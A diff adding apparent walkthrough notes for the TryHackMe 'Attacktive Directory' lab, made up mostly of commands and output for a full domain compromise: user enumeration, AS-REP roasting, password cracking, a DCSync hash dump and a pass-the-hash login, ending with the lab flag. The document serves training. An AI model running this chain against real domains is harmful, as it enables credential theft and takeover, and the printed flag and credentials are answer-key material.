@@ -1,0 +1,179 @@
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: IIS Windows Server
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-05 08:28:31Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2025-08-05T08:29:43+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
+| Not valid before: 2025-08-04T08:23:45
+|_Not valid after:  2026-02-03T08:23:45
+| rdp-ntlm-info: 
+|   Target_Name: THM-AD
+|   NetBIOS_Domain_Name: THM-AD
+|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
+|   DNS_Domain_Name: spookysec.local
+|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-08-05T08:29:33+00:00
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49670/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+49672/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  msrpc         Microsoft Windows RPC
+49682/tcp open  msrpc         Microsoft Windows RPC
+49693/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-08-05T08:29:33
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+
+
+
+//use kerbute to enum all valid users in this domain.
+//  NOT recommended to brute force credentials due to account lockout policies that we cannot enumerate on the domain controller.
+└─$ ./kerbrute_linux_386 userenum --dc spookysec.local -d spookysec.local ~/oscptest/ad.thm/userlist.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 08/07/25 - Ronnie Flathers @ropnop
+
+2025/08/07 20:07:09 >  Using KDC(s):
+2025/08/07 20:07:09 >  	spookysec.local:88
+
+2025/08/07 20:07:10 >  [+] VALID USERNAME:	 james@spookysec.local
+2025/08/07 20:10:02 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
+2025/08/07 20:10:10 >  [+] VALID USERNAME:	 James@spookysec.local
+2025/08/07 20:10:13 >  [+] VALID USERNAME:	 robin@spookysec.local
+2025/08/07 20:10:50 >  [+] VALID USERNAME:	 darkstar@spookysec.local
+2025/08/07 20:11:11 >  [+] VALID USERNAME:	 administrator@spookysec.local
+2025/08/07 20:14:22 >  [+] VALID USERNAME:	 backup@spookysec.local
+2025/08/07 20:14:42 >  [+] VALID USERNAME:	 paradox@spookysec.local
+2025/08/07 20:56:07 >  [+] VALID USERNAME:	 Darkstar@spookysec.local
+2025/08/07 21:01:19 >  [+] VALID USERNAME:	 Paradox@spookysec.local
+2025/08/07 21:25:16 >  [+] VALID USERNAME:	 DARKSTAR@spookysec.local
+2025/08/07 21:32:42 >  [+] VALID USERNAME:	 ori@spookysec.local
+
+
+
+//svc-admin and backup is interesting.
+└─$ impacket-GetNPUsers -no-pass -usersfile user spookysec.local/
+//use getnpuser to identify users, not required to provide valid identification before requesting a Kerberos Ticket on the specified user account.
+
+
+└─$ impacket-GetNPUsers -no-pass -usersfile user spookysec.local/
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:0461abc73a780870a948c44eb3a10d8f$b580a5313ccdcf37b7f72ae76d69210d403796b7947358cc6853180480dbde269964308061e72dc56e3700ef4445b874b9c8a695c103791ebc35a7a1b21cd24305a324646030ac2b5ae19b5b16392fe9f1482ff8f1c6d1a4311e577adc2f9d632e54cc2ed1625c84aa27c78717db11e8d94ac7d9b455d5c274a258af0cdd1edd7d0eb3c1dfb2aba86a97163d8830447e3a6645e6c6bded6742e7616f04e574a6e02d477c8d6f313e53a89d2b52b78513d92ec8e0c436bb7812a95b092689bb3ab6bd3bc98b197fb4233ce4bad7619953644aa444a120da09a0e136b34fc531a05132fd647ca69868179c07312167e97d7a85
+
+└─$ john hash --wordlist=passwordlist.txt       
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)     
+1g 0:00:00:00 DONE (2025-08-07 21:29) 33.33g/s 230400p/s 230400c/s 230400C/s horoscope..center
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+
+└─$ netexec smb 10.201.105.224 -u svc-admin -p 'management2005' --shares
+SMB         10.201.105.224  445    ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
+SMB         10.201.105.224  445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005 
+SMB         10.201.105.224  445    ATTACKTIVEDIREC  [*] Enumerated shares
+SMB         10.201.105.224  445    ATTACKTIVEDIREC  Share           Permissions     Remark
+SMB         10.201.105.224  445    ATTACKTIVEDIREC  -----           -----------     ------
+SMB         10.201.105.224  445    ATTACKTIVEDIREC  ADMIN$                          Remote Admin
+SMB         10.201.105.224  445    ATTACKTIVEDIREC  backup          READ            
+SMB         10.201.105.224  445    ATTACKTIVEDIREC  C$                              Default share
+SMB         10.201.105.224  445    ATTACKTIVEDIREC  IPC$            READ            Remote IPC
+SMB         10.201.105.224  445    ATTACKTIVEDIREC  NETLOGON        READ            Logon server share 
+SMB         10.201.105.224  445    ATTACKTIVEDIREC  SYSVOL          READ            Logon server share 
+
+
+└─$ smbclient //10.201.105.224/backup --user=svc-admin --password='management2005' -L
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Sat Apr  4 12:08:39 2020
+  ..                                  D        0  Sat Apr  4 12:08:39 2020
+  backup_credentials.txt              A       48  Sat Apr  4 12:08:53 2020
+
+YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
+
+backup@spookysec.local:backup2517860
+
+//backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes
+
+└─$ impacket-secretsdump -target-ip 10.201.105.224 spookysec.local/backup:backup2517860@spookysec.local
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:    0e0363213e37b94221497260b0bcb4fc   :::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
+spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
+spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
+spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
+spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
+spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
+spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
+spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
+spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
+spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
+spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
+spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
+spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:ec9091988be73f5bc614bcd0e9f177ab:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
+Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
+Administrator:des-cbc-md5:2079ce0e5df189ad
+krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
+
+[*] Cleaning up... 
+
+└─$ evil-winrm -i 10.201.105.224 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+    Directory: C:\Users\Administrator\desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         4/4/2020  11:39 AM             32 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
+TryHackMe{4ctiveD1rectoryM4st3r}
